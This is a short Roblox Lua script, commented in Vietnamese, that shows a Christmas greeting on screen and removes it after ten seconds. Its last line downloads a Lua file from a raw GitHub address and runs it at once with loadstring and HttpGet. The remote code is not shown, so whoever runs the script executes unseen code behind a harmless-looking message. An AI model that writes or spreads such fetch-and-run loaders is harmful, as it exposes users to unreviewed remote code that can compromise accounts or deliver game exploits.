-- Tạo GUI
local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")

-- Gắn GUI
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Cài đặt thông báo
TextLabel.Parent = ScreenGui
TextLabel.Text = "sắp tới giáng sinh rồi🥵🥵"
TextLabel.Size = UDim2.new(0.5, 0, 0.2, 0) -- Kích thước thông báo
TextLabel.Position = UDim2.new(0.25, 0, 0.4, 0) -- Vị trí giữa màn hình
TextLabel.BackgroundColor3 = Color3.new(0, 0, 0) -- Màu nền (đen)
TextLabel.BackgroundTransparency = 0.5 -- Độ trong suốt của nền
TextLabel.TextColor3 = Color3.new(0, 1, 0) -- Màu chữ (xanh lá cây)
TextLabel.Font = Enum.Font.SourceSansBold -- Font chữ
TextLabel.TextScaled = true -- Tự động điều chỉnh kích thước chữ

-- Tự động ẩn
wait(10)
ScreenGui:Destroy()

-- Tải và chạy mã từ URL sau khi hiển thị thông 
loadstring(game:HttpGet("https://raw.githubusercontent.com/hsg251/bolocphut/refs/heads/main/thanhdan357.lua"))()
